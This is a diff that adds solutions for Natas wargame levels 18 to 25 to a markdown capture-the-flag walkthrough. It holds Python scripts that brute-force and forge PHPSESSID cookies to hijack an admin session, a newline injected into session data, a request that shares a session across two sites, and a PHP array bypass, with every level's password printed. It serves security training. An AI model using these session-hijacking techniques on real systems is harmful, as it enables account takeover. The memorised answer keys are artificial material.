@@ -315,20 +315,140 @@ while len(password) != pwd_len:
 
 | Username | Password |
 | :--- | :--- |
-| natas18 |  |
+| natas18 | 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq |
 
+```
+check sourcecode php
+Session Hijacking
+now, start brute force it
+import requests
+target = 'http://natas18.natas.labs.overthewire.org'
+auth = ('natas18','8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
+params = dict(username='admin', password='pass')
+cookies = dict()
+max_s_id = 640
+s_id = 1
+while s_id <= max_s_id:
+	print("PHPSESSID = " + str(s_id))
+	cookies = dict(PHPSESSID=str(s_id))
+	r = requests.get(target, auth=auth, params=params, cookies=cookies)
+	if "You are an admin" in r.text:
+		print (r.text)
+		break
+	s_id += 1
+```
 
+| Username | Password |
+| :--- | :--- |
+| natas19 | 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s |
 
+```
+login with admin:pass
+check cookie PHPSESSID: 3535362d61646d696e
+after research with diffirent account
+check cookie PHPSESSID: 3237312d61646d696e
+our PHPSESSID should be like this: ******2d61646d696e
+now, start brute force it
+import requests
+import sys
+target = 'http://natas19.natas.labs.overthewire.org'
+auth = ('natas19','8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
+params = dict(username='admin', password='pass')
+cookies = dict()
+x = 0x0
+y = 0x0
+z = 0x0
+while x <= 0xf:
+    while y <= 0xf:
+        while z <= 0xf:
+            phpsessid = (('3%s3%s3%s2d61646d696e') %
+                         (hex(x)[2:], hex(y)[2:], hex(z)[2:]))
+            cookies['PHPSESSID'] = phpsessid
+            print('Trying with: %s' % phpsessid)
+            r = requests.get(target, auth=auth, params=params, cookies=cookies)
+            if "You are logged in as a regular user." not in r.text:
+                print(r.text)
+                sys.exit(0)
+            z += 1
+        y += 1
+        z = 0x0
+    x += 1
+    y = 0x0
+    z = 0x0
+sys.exit(1)
+```
 
+| Username | Password |
+| :--- | :--- |
+| natas20 | guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH |
 
+```
+check sourcecode php
+now, write script to reverse it
+import requests
+target = 'http://natas20.natas.labs.overthewire.org'
+auth = ('natas20', 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH')
+params = dict(name='admin\nadmin 1', debug='')
+cookies = dict()
+r = requests.get(target, auth=auth, params=params, cookies=cookies)
+phpsessid = r.cookies['PHPSESSID']
+print(r.text)
+print()
+params = dict(debug='')
+cookies = dict(PHPSESSID=phpsessid)
+r = requests.get(target, auth=auth, params=params, cookies=cookies)
+print(r.text)
+```
 
+| Username | Password |
+| :--- | :--- |
+| natas21 | 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56 |
 
+```
+check sourcecode php
+two websites are sharing the same session
+import requests
+target = 'http://natas21-experimenter.natas.labs.overthewire.org'
+auth = ('natas21', '89OWrTkGmiLZLv12JY4tLj2c4FW0xn56')
+params = dict(debug='', submit='', admin=1)
+cookies = dict()
+r = requests.get(target, auth=auth, params=params, cookies=cookies)
+phpsessid = r.cookies['PHPSESSID']
+print(r.text)
+target = 'http://natas21.natas.labs.overthewire.org'
+params = dict(debug='')
+cookies = dict(PHPSESSID=phpsessid)
+r = requests.get(target, auth=auth, params=params, cookies=cookies)
+print(r.text)
+```
 
+| Username | Password |
+| :--- | :--- |
+| natas22 | 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s |
 
+```
+check sourcecode php
+curl -i -XGET -u natas22:91awVM9oDiUGm33JdzM7RVLBS8bz9n0s http://natas22.natas.labs.overthewire.org/?revelio
+```
 
+| Username | Password |
+| :--- | :--- |
+| natas23 | qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj |
 
+```
+check sourcecode php
+input password: 11iloveyou
+```
 
+| Username | Password |
+| :--- | :--- |
+| natas24 | 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r |
 
+```
+check sourcecode php
+https://natas24.natas.labs.overthewire.org/?passwd[]=1
+```
 
-
-
+| Username | Password |
+| :--- | :--- |
+| natas25 | O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx |
